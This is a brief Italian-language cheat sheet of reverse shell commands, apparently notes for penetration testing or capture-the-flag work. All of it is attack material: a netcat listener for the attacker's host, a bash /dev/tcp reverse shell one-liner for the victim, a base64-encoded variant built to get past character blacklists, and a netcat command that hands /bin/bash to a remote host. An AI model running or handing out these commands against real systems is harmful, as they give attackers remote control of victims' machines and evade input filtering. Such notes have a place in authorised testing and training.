# Reverse Shell


host:
```
nc -nvlp <PORT>
```

## bash

vittima:
```
bash -c “bash -i >& /dev/tcp/{IP}/{PORT} 0>&1”
```

### Blacklist

se blacklist di caratteri

```
echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" | base64

bash -c {<BASE64_ENCODE>}|{base64,-d}|{bash,-i}
```



## netcat

```
nc <IP> <PORT> -e /bin/bash
```
